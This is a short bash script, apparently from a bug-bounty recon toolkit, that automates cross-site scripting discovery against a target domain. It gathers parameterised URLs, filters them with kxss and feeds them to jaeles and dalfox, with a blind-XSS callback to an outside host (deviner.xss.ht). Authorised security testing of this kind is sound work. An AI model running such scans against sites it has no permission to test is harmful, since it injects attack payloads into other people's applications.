#!/bin/bash


mkdir ~/recon/$1/XSS;
results=~/recon/$1/XSS
urls=~/recon/$1/Extraction

echo -e "\n[+] Automating XSS for $1...!!"

BLIND="https://deviner.xss.ht"
cat $urls/$1_param_value.txt | tee $results/$1_xss_urls.txt
cat $urls/GF/$1_xss.txt | tee -a $results/$1_xss_urls.txt
cat $results/$1_xss_urls.txt | sort -u | tee -a $results/$1_xss_urls_unique.txt

cat $results/$1_xss_urls_unique.txt | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | \
tee $results/$1_potential-xss.txt
cat $results/$1_potential-xss.txt | jaeles scan -s ~/Trishul/templates/jaeles-open-signatures/categorized/xss/ -v -O $results/$1_jaeles_out.txt
cat $results/$1_potential-xss.txt | dalfox pipe -b $BLIND -o $results/$1_dalfox_out.txt;


echo -e "\n[+] Completed...!! Results stored in: $results"

